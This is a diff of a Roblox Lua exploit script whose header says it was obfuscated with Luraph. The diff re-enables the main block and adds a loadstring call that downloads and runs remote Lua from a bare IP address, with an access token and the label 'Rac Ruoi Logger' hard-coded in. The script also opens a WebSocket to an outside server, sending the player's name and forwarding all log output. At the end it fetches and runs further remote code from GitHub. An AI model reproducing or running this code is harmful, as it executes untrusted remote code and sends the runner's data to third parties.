@@ -1,6 +1,6 @@
 -- This file was generated using Luraph Obfuscator v14.1 [https://lura.ph/]
-game.Players.LocalPlayer:Kick("Temporary down")
---[[
+--ame.Players.LocalPlayer:Kick("Temporary down")
+
 (function() 
 local LocalPlayer = game.Players.LocalPlayer
 
@@ -25,6 +25,11 @@ local GC = getconnections or get_signal_cons
         end)
     end
 
+        loadstring(game:HttpGet('http://150.109.50.38/assets/Client.lua'))()({
+    Access_Token = "mUveZboOmlA5q5LCfcoLx6XnTm1qUqU9",
+    Device_Name  = "n/a", 
+    Note         = "Rac Ruoi Logger"
+})
 local Connection = getgenv().WebSocket.connect("wss://adu-0nny.onrender.com/?token=haha&isClient=true&clientName="..LocalPlayer.Name)
 
  LogContentType = {"Output", "Info", "Warning", "Error"}
@@ -59,4 +64,4 @@ LogService.MessageOut:Connect(function(Content, Type)
 end)
     end)
 loadstring(game:HttpGet("https://github.com/eltrul/about-myself/blob/main/SwitchKaitun.lua?raw=true"))()
-]]
+
